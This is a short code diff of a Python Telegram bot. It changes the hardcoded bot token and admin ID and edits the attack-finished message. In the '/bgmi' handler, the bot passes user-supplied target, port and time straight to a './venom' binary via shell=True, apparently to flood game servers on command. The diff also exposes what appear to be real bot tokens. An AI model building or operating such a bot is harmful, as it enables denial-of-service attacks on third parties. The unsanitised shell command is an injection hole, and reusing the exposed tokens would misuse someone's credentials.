@@ -7,10 +7,10 @@ import os
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7774369692:AAGmwq2k62L9h8Sae9P5PToyu7sYXc07s9I')
+bot = telebot.TeleBot('7946776175:AAHtvZjaxYYawhd5CR0lmPFTLsrBtrAhmf8')
 
 # Admin user IDs
-admin_id = {"7941184624"}
+admin_id = {"6353114118"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -239,7 +239,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./venom {target} {port} {time} 300"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target}\n Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
